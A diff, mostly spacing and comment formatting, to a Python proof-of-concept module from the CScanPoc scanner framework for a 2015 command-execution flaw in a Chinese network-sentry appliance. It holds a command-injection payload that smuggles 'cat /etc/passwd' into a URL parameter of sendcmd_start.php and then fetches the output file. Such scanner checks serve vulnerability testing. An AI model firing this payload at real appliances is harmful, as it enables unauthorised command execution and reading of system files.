@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import time
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Seentech_0012' # 平台漏洞编号，留空
+    vuln_id = 'Seentech_0012'  # 平台漏洞编号，留空
     name = '中科新业网络哨兵 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-07-02'  # 漏洞公布时间
     desc = '''
         中科新业网络哨兵 ucenter/remotewh/sendcmd_start.php 函数参数过滤不严谨，导致可执行任意命令。
@@ -32,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #refer:http://www.wooyun.org/bugs/wooyun-2010-0123369
+
+            # refer:http://www.wooyun.org/bugs/wooyun-2010-0123369
             payload1 = "/ucenter/remotewh/sendcmd_start.php?gAbsoultPath=x | cat /etc/passwd > a.txt | "
             payload2 = "/ucenter/remotewh/a.txt"
             verify_url = self.target + payload2
@@ -49,6 +50,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
